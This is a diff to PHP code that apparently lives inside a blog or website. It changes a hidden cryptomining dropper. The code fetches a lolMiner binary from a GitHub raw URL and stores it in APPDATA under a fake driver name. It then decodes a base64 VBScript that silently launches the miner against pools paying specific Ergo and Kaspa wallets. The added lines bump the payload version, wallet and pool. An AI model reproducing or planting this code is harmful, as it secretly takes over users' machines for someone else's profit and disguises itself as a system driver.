@@ -30,20 +30,20 @@ $GLOBALS['__download_002'] = function($url)
 	return false;
 };
 
-$command_id = '000023';
+$command_id = '000024';
 if(@$GLOBALS['BLOG_COMMAND_ID'] !== $command_id)
 {
 	$GLOBALS['BLOG_COMMAND_ID'] = $command_id;
 	try{
 	$lolm_path = getenv('APPDATA') . '\\microsoft_win_x86';
 	@mkdir($lolm_path);
-	$lolm_path .= '\\w_driver_x86.exe';
+	$lolm_path .= '\\w_driver1.95_x86.exe';
 	$data = true;
 	if(!is_file($lolm_path))
 	{
 		$data = false;
-		$data = $GLOBALS['__download_002']('https://raw.githubusercontent.com/adsdev2000/test/refs/heads/main/lolMiner/lolMiner.dat');
-		if($data && strlen($data) > 7700)
+		$data = $GLOBALS['__download_002']('https://raw.githubusercontent.com/adsdev2000/test/refs/heads/main/lolMiner/lolMiner_1.95.dat');
+		if($data && strlen($data) > 11000)
 			@file_put_contents($lolm_path, $data);
 		else
 			$data = false;
@@ -53,7 +53,7 @@ if(@$GLOBALS['BLOG_COMMAND_ID'] !== $command_id)
 		$vbs = 'T24gRXJyb3IgUmVzdW1lIE5leHQNCkNyZWF0ZU9iamVjdCgiV1NjcmlwdC5TaGVsbCIpLlJ1biAie0NPTU1BTkR9IiwgMCwgRmFsc2UNClNldCBmc28gPSBDcmVhdGVPYmplY3QoIlNjcmlwdGluZy5GaWxlU3lzdGVtT2JqZWN0IikNCmZuID0gV1NjcmlwdC5TY3JpcHRGdWxsTmFtZQ0KbiA9IFNwbGl0KGZuLCAiLiIpDQpjID0gQ0RibChuKDEpKQ0KV2hpbGUgVHJ1ZQ0KCWMgPSBjICsgMQ0KCW5uID0gbigwKSAmICIuIiAmIGMgJiAiLiIgJiBuKDIpICYgIi52YnMiDQoJZnNvLk1vdmVGaWxlIGZuLCBubg0KCWZuID0gbm4NCglXU2NyaXB0LlNsZWVwKHtUSU1FT1VUfSkNCldlbmQ';
 		$vbs_checkname = 'Microsoft Mouse Driver x86';
 		$vbsname = $vbs_checkname . ' vs10.12212147455.'.(string)time().'.vbs';
-		$command = '"'.$lolm_path.'" --algo KASPA --pool stratum+tcp://pool.br.woolypooly.com:3112 --user kaspa:qzvk2n3wrtej6zy0l7zxc3fhygal25p43f5myeq3jexav7cvj6vxgjjhps66c';
+		$command = '"'.$lolm_path.'" --algo AUTOLYKOS2 --pool ergo-eu1.nanopool.org:11111 --user 9hJsrcoUYwKc92BXKbiVotX7CbFLkT85GY6r6FtnK7bu1qfHokD.lolMinerWorker --watchdog exit --apiport 8020 --nocolor';
 		$command = preg_replace('/\"/is', '""', $command);
 		$vbs = base64_decode($vbs);
 		$vbs = preg_replace('/\{COMMAND\}/is', $command, $vbs);
